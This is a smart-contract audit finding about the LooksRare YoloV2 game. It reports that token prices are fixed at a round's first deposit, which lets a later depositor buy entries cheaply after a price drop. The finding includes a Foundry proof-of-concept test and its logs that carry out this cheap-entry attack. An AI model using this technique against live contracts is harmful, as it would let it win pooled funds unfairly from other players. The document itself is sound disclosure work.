Gentle Sepia Ant

medium

# `_deposit()` function, the price of ERC20 and ERC721, the price is initialized only when the token is deposited for the first time, and the price of the first initialization will be used as the quotation for subsequent periods. Affect the fairness of the game

## Summary
`_deposit()` function, ERC20 and ERC721 price, only initialize the price when the token is deposited for the first time, and the subsequent rounds will be quoted at the price of the first initialization.If the price of the corresponding token falls in a short period of time, it will disrupt the balance of the game, An attacker can obtain the same amount of 'currentEntryIndex' at a lower cost, improve their own odds.
## Vulnerability Detail
https://github.com/sherlock-audit/2024-01-looksrare/blob/main/contracts-yolo/contracts/YoloV2.sol#L1095-L1101
https://github.com/sherlock-audit/2024-01-looksrare/blob/main/contracts-yolo/contracts/YoloV2.sol#L1161-L1165
Both ERC20 and ERC721 only save quotes when tokens are deposited for the first time, and are used for the rest of the game round. If the price of the token falls within a while, the attacker can use the cheaper cost to obtain the same `currentEntryIndex`, which increases the game odds in disguise.

The following test content is a total of 4 players, the price of USDC in the first round remains unchanged, players participate in the game with the equivalent of 1 ether, at this time, each player's probability of winning is 25%, the odds after winning are 1 ether : 4 ether(1:4), and the profit is 3 ether. In the second round of the game, because the token price fell by 50% when the attacker deposited, attacker actual bet amount was 0.5 ether, and in the case of the same 25% win rate, attacker odds rose to 0.5 ether :3 ether(1:6) and the profit was 2.5 ether, real odds were 1:5. If User3 only invests 0.01 ether of USDC to participate in the game, then the attacker will have a 33% probability of winning, a true odds of 0.5 ether : 2.5 ether (1:5), and a profit of 2 ether ,the input-output ratio is 1:4.At this time, the winning odds of user1 and user2 are 1 ether : 2.5 ether, the profit is 1.5 ether, and the input-output ratio is only 2:3

```js
    function playARound(uint256 _roundId, uint256 _requestId, bool _ifPriceFall) public returns (uint256 usdcPrice) {
        // 1st user deposits 1 ether 
        vm.deal(user1, 1 ether);
        vm.prank(user1);
        yolo.deposit{value: 1 ether}(_roundId, _emptyDepositsCalldata());
        // 2nd user deposits ether
        vm.deal(user2, 1 ether);
        vm.prank(user2);
        yolo.deposit{value: 1 ether}(_roundId, _emptyDepositsCalldata());
        usdcPrice = priceOracle.getTWAP(USDC, 3600);
        // 3nd user deposits 1575e6 USDC
        deal(USDC, user3, 1575e6);
        IYoloV2.DepositCalldata[] memory depositsCalldata = new IYoloV2.DepositCalldata[](1);
        depositsCalldata[0].tokenType = IYoloV2.YoloV2__TokenType.ERC20;
        depositsCalldata[0].tokenAddress = USDC;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 1575e6;
        depositsCalldata[0].tokenIdsOrAmounts = amounts;
        _grantApprovalsToTransferManager(user3);
        vm.startPrank(user3);
        IERC20(USDC).approve(address(transferManager), 1575e6);
        yolo.deposit(_roundId, depositsCalldata);
        vm.stopPrank();
        // Simulate a Prices Fall
        if (_ifPriceFall) {
            vm.startPrank(operator);
            priceOracle.setTokenPrice(usdcPrice / 2);
            priceOracle.setWitch(true);
            vm.stopPrank();
            assertEq(usdcPrice / 2, priceOracle.getTWAP(USDC, 3600));
            // The quote in this case is 1/2 of the previous quote
            usdcPrice = priceOracle.getTWAP(USDC, 3600);
        }
        // attacker deposits 1575e6 USDC
        address attacker = makeAddr("attacker");
        deal(USDC, attacker, 1575e6);
        depositsCalldata = new IYoloV2.DepositCalldata[](1);
        depositsCalldata[0].tokenType = IYoloV2.YoloV2__TokenType.ERC20;
        depositsCalldata[0].tokenAddress = USDC;
        amounts[0] = 1575e6;
        depositsCalldata[0].tokenIdsOrAmounts = amounts;
        _grantApprovalsToTransferManager(attacker);
        vm.startPrank(attacker);
        IERC20(USDC).approve(address(transferManager), 1575e6);
        yolo.deposit(_roundId, depositsCalldata);
        vm.stopPrank();
        _drawRound(); 
        uint256[] memory randomWords = new uint256[](1);
        //Winner will be the same every round, given the same entry count
        randomWords[0] = 2345782359082359082359082359239741234971239412349234892349234;
        vm.prank(VRF_COORDINATOR);
        VRFConsumerBaseV2(yolo).rawFulfillRandomWords(_requestId, randomWords);
    }

    // @audit-medium Since the corresponding token at the time of deposit only retains the starting price, when the price fluctuates greatly during the game time, the attacker can exchange for more chances of winning at a small price, affecting the game balance
    function testTokenPricesFall() public {
        uint256 usdcPrice = playARound(1, FULFILL_RANDOM_WORDS_REQUEST_ID, false);
        console.log(usdcPrice);
        //  get round one detail
        (
            IYoloV2.RoundStatus status,
            uint40 maximumNumberOfParticipants,
            uint16 protocolFeeBp,
            ,
            ,
            uint40 numberOfParticipants,
            address roundWinner,
            uint96 valuePerEntry,
            uint256 protocolFeeOwed,
            IYoloV2.Deposit[] memory deposits
        ) = yolo.getRound(1);
        uint256 roundOneProtocolFeeOwed = protocolFeeOwed;
        uint256 roundOneUsdcPrice = usdcPrice;
        usdcPrice = playARound(2, FULFILL_RANDOM_WORDS_REQUEST_ID_2, true);
        //  get round two detail
        (
            status,
            maximumNumberOfParticipants,
            protocolFeeBp,
            ,
            ,
            numberOfParticipants,
            roundWinner,
            valuePerEntry,
            protocolFeeOwed,
            deposits
        ) = yolo.getRound(2);
        console.log("maximumNumberOfParticipants:", maximumNumberOfParticipants);
        console.log("protocolFeeBp:", protocolFeeBp);
        console.log("valuePerEntry:", valuePerEntry);
        console.log("protocolFeeOwed:", protocolFeeOwed);
        console.log("numberOfParticipants:", numberOfParticipants);
        console.log("usdcPrice:", usdcPrice);
        uint256 roundTwoProtocolFeeOwed = protocolFeeOwed;
        uint256 roundTwoUsdcPrice = usdcPrice;
        assertEq(roundOneProtocolFeeOwed, roundTwoProtocolFeeOwed);
        assertEq(roundTwoUsdcPrice, roundOneUsdcPrice / 2);
        // [PASS] testTokenPricesFall() (gas: 1822428)
        // Logs:
        // 635032386273720
        // maximumNumberOfParticipants: 20
        // protocolFeeBp: 300
        // valuePerEntry: 10000000000000000
        // protocolFeeOwed: 120000000000000000
        // numberOfParticipants: 4
        // usdcPrice: 317516193136860
    }
```
## Impact
Prices are not updated in a timely manner,Affect the fairness of the game
## Code Snippet
https://github.com/sherlock-audit/2024-01-looksrare/blob/main/contracts-yolo/contracts/YoloV2.sol#L1095-L1101
https://github.com/sherlock-audit/2024-01-looksrare/blob/main/contracts-yolo/contracts/YoloV2.sol#L1161-L1165
## Tool used
Manual Review
## Recommendation
Since the game uses multiple tokens, players are advised to use the latest offer calculation for each bet